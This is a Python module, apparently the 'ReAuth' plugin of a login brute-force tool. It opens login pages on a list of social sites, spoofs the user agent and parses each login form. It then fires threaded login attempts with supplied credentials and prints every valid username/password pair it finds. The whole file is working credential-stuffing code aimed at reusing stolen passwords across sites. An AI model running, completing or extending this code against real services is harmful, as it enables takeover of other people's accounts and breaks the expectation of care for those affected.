
from core import utils, tbrowser, actions
from plugins import loginbrute
import data, threading

# BUG stackoverflow wrong result randomly

try:
	from Queue import Queue
except ImportError:
	from queue import Queue

def do_job(jobs):
	for job in jobs:
		job.start()

	for job in jobs:
		job.join()

def run(checkedURL, creds, optionThreads, optionProxy, optionVerbose):
	# def submit(optionURL, tryCred, setProxyList, setKeyFalse, optionVerbose, loginInfo, result):
	social_urls = data.social_urls().replace("\t", "").split("\n")


	result = Queue()
	workers = []

	try:
		for optionURL in social_urls:
			if checkedURL.split("/")[2] in optionURL:
				pass #TODO improve this idea by remove it before doing
			else:
				# TODO add exception
				# TODO better threads: this thread is shits
				# both checking and doing in threading
				# currently checking is single threads
				# create new function that checking and calling (without thread)
				# Threading it
				utils.printf("[+] Checking %s" %(optionURL))
		
				proc = tbrowser.startBrowser()

				proc.addheaders = [('User-Agent', tbrowser.useragent())]
				proc.open(optionURL)
				loginInfo = tbrowser.parseLoginForm(proc.forms())
				if not loginInfo:
					pass # TODO Alert here
				else:
					try:
						if optionVerbose:
							utils.printf("[*] Form ID: %s\n  [*] Username field: %s\n  [*] Password field: %s"
								%(loginInfo[0], loginInfo[1][0], loginInfo[1][1]), "good")
						
						#TODO add found URL 
						for tryCred in creds:
							if actions.size_o(workers) == optionThreads:
								do_job(workers)
								del workers[:]

							worker = threading.Thread(
								target = loginbrute.submit,
								args = (
									optionURL, tryCred[::-1], optionProxy, # Reverse username + password. Dynamic submit in loginbrute
									"", optionVerbose, loginInfo, result, True # No key false by default, result now should be url
								)
							)
							worker.daemon = True
							workers.append(worker)

					except Exception as err:
						utils.die("[x] ReAuth: Setting threads error", err)
		do_job(workers)
		del workers[:]
		
	
	except KeyboardInterrupt:# as error:
		# TODO: kill running threads here
		utils.die("[x] Terminated by user!", "KeyboardInterrupt")

	except SystemExit:# as error
		utils.die("[x] Terminated by system!", "SystemExit")
	
	except Exception as err:
		utils.die("[x] ReAuth: Runtime error", err)
				
	finally:
		social_creds = list(result.queue)

		if actions.size_o(social_creds) == 0:
			utils.printf("[-] No extra valid password found", "bad")
		else:
			utils.print_table(("Target", "Username", "Password"), *social_creds)